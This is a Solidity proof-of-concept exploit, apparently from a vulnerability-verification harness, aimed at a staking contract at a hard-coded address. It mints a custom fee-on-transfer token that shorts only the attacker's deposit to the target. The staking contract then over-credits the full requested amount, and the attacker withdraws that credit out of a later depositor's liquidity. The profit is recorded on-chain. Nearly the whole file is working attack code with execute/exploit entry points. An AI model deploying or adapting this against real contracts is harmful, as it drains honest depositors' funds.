// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IStaking {
    function deposit(address tokenAddress, uint256 amount, address referrer) external;
    function withdraw(address tokenAddress, uint256 amount) external;
    function balanceOf(address user, address token) external view returns (uint256);
}

contract LiquiditySeeder {
    function seed(address staking, address token, uint256 amount) external {
        _forceApprove(token, staking, amount);
        IStaking(staking).deposit(token, amount, address(0));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
    }

    function _callOptionalReturn(address target, bytes memory data) internal {
        (bool ok, bytes memory ret) = target.call(data);
        require(ok, "token call failed");
        if (ret.length > 0) {
            require(abi.decode(ret, (bool)), "token call false");
        }
    }
}

contract FeeOnTransferToken is IERC20 {
    string public constant NAME = "Taxed Stake Token";
    string public constant SYMBOL = "TAX";
    uint8 public constant DECIMALS = 18;

    uint256 public totalSupply;
    uint256 public immutable FEE_BPS;
    address public immutable TAXED_SENDER;
    address public immutable TAXED_RECIPIENT;
    address public immutable BURN_SINK;

    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;

    constructor(
        address attacker,
        address honestDepositor,
        address stakingTarget,
        uint256 attackerMint,
        uint256 honestMint,
        uint256 feeBps_
    ) {
        TAXED_SENDER = attacker;
        TAXED_RECIPIENT = stakingTarget;
        BURN_SINK = address(0x000000000000000000000000000000000000dEaD);
        FEE_BPS = feeBps_;

        _mint(attacker, attackerMint);
        _mint(honestDepositor, honestMint);
    }

    function balanceOf(address account) external view returns (uint256) {
        return balances[account];
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 currentAllowance = allowances[from][msg.sender];
        require(currentAllowance >= amount, "allowance too small");
        if (currentAllowance != type(uint256).max) {
            allowances[from][msg.sender] = currentAllowance - amount;
            emit Approval(from, msg.sender, allowances[from][msg.sender]);
        }

        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balances[from] >= amount, "balance too small");

        balances[from] -= amount;

        uint256 fee = _fee(from, to, amount);
        uint256 received = amount - fee;

        balances[to] += received;
        emit Transfer(from, to, received);

        if (fee > 0) {
            balances[BURN_SINK] += fee;
            emit Transfer(from, BURN_SINK, fee);
        }
    }

    function _fee(address from, address to, uint256 amount) internal view returns (uint256) {
        if (from == TAXED_SENDER && to == TAXED_RECIPIENT) {
            return (amount * FEE_BPS) / 10_000;
        }
        return 0;
    }

    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;
        balances[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);
}

contract FlawVerifier {
    address public constant TARGET = 0x245a551ee0F55005e510B239c917fA34b41B3461;

    string public constant EXPLOIT_PATH_USED =
        "Use a non-stable token that transfers only amount - fee to the staking contract -> call deposit(token, amount, referrer) so staking credits the full requested amount instead of the net received amount -> later withdraw the full recorded balance, consuming liquidity supplied by a later depositor.";

    uint256 private constant ATTACK_DEPOSIT = 1_000_000e18;
    uint256 private constant LATER_HONEST_DEPOSIT = 1_000_000e18;
    uint256 private constant FEE_BPS = 1_000;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;
    bool public profitAchieved;
    string public failureReason;

    address public exploitToken;
    address public laterDepositor;

    uint256 public recordedStakeBefore;
    uint256 public recordedStakeAfterAttackDeposit;
    uint256 public recordedStakeWithdrawn;

    uint256 public attackerPoolBalanceBefore;
    uint256 public attackerPoolBalanceAfterAttackDeposit;
    uint256 public poolBalanceAfterLaterDeposit;
    uint256 public poolBalanceAfterWithdraw;

    uint256 public attackerWalletBefore;
    uint256 public attackerWalletAfterAttackDeposit;
    uint256 public attackerWalletAfterWithdraw;

    uint256 public attackRequestedAmount;
    uint256 public attackNetReceivedByPool;
    uint256 public poolTokensSpentOnWithdraw;

    constructor() {}

    function execute() external {
        _run();
    }

    function run() external {
        _run();
    }

    function verify() external {
        _run();
    }

    function exploit() external {
        _run();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _run() internal {
        require(!executed, "already executed");
        executed = true;
        require(TARGET.code.length > 0, "target not deployed");

        LiquiditySeeder seeder = new LiquiditySeeder();
        laterDepositor = address(seeder);

        FeeOnTransferToken token = new FeeOnTransferToken(
            address(this),
            address(seeder),
            TARGET,
            ATTACK_DEPOSIT,
            LATER_HONEST_DEPOSIT,
            FEE_BPS
        );
        exploitToken = address(token);

        attackerWalletBefore = token.balanceOf(address(this));
        attackerPoolBalanceBefore = token.balanceOf(TARGET);
        recordedStakeBefore = IStaking(TARGET).balanceOf(address(this), address(token));

        attackRequestedAmount = ATTACK_DEPOSIT;
        _forceApprove(address(token), TARGET, attackRequestedAmount);

        IStaking(TARGET).deposit(address(token), attackRequestedAmount, address(0));

        attackerWalletAfterAttackDeposit = token.balanceOf(address(this));
        attackerPoolBalanceAfterAttackDeposit = token.balanceOf(TARGET);
        recordedStakeAfterAttackDeposit = IStaking(TARGET).balanceOf(address(this), address(token));

        attackNetReceivedByPool = attackerPoolBalanceAfterAttackDeposit - attackerPoolBalanceBefore;
        recordedStakeWithdrawn = recordedStakeAfterAttackDeposit - recordedStakeBefore;

        require(recordedStakeWithdrawn == attackRequestedAmount, "deposit not over-credited as expected");
        require(attackNetReceivedByPool < attackRequestedAmount, "token did not short-transfer to staking");
        hypothesisValidated = true;

        // The later honest deposit is part of the stated exploit path and is strictly required
        // to give the underfunded pool enough balance for the attacker to withdraw the full credit.
        seeder.seed(TARGET, address(token), LATER_HONEST_DEPOSIT);
        poolBalanceAfterLaterDeposit = token.balanceOf(TARGET);

        IStaking(TARGET).withdraw(address(token), recordedStakeWithdrawn);

        attackerWalletAfterWithdraw = token.balanceOf(address(this));
        poolBalanceAfterWithdraw = token.balanceOf(TARGET);

        require(poolBalanceAfterLaterDeposit >= poolBalanceAfterWithdraw, "withdraw did not reduce pool balance");
        poolTokensSpentOnWithdraw = poolBalanceAfterLaterDeposit - poolBalanceAfterWithdraw;
        require(poolTokensSpentOnWithdraw == recordedStakeWithdrawn, "pool did not spend full credited amount");

        _profitAmount = poolTokensSpentOnWithdraw - attackNetReceivedByPool;
        require(_profitAmount > 0, "withdraw did not consume later liquidity");

        _profitToken = address(token);
        profitAchieved = true;
        failureReason = "";
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
    }

    function _callOptionalReturn(address target, bytes memory data) internal {
        (bool ok, bytes memory ret) = target.call(data);
        require(ok, "token call failed");
        if (ret.length > 0) {
            require(abi.decode(ret, (bool)), "token call false");
        }
    }
}
